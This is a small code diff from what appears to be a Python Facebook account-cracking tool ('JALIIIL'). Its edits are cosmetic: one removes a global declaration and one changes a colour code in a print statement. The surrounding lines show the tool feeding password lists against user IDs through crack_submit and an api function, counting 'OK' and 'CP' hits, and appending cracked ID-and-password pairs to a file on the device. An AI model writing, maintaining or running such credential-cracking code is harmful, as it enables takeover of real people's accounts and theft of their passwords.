@@ -290,7 +290,6 @@ def menu():
 						 crack_submit.submit(sajid4,ids,names,passlist)
 				print('\033[1;37m')
 				linex()
-				global loop,oks,cps 
 				print(' The process has completed')
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
@@ -536,7 +535,7 @@ def api(ids,names,passlist):
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
+						print('\r\r\033[1;33m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
 						open('/sdcard/JALIIIL/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
